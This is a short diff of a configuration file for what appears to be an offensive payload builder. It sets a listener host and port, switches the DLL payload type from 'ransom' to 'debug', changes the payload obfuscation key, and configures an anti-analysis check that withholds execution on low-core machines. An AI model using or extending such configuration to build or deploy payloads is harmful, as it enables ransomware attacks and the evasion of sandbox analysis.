@@ -3,7 +3,7 @@
 lhost="0.0.0.0"
 lport=443
 # DLL Payload, need to match src/dll/<type>.c
-type=ransom
+type=debug
 
 # xor, dictionary (not yet aes/rc4) (XOR SEEMS NO BUENO ANYMORE)
 # encryption_method=xor
@@ -12,7 +12,7 @@ encryption_method=dictionary
 # XOR key, if encryption_method=xor else ignored
 # random -> between 0x1111 and 0xffff with good entropy
 # encryption_key=random
-encryption_key=0x3e4b
+encryption_key=0xabcd
 
 [Anti-Analysis]
 # If cpu cores is less or equal than <value>, the payload will not be executed
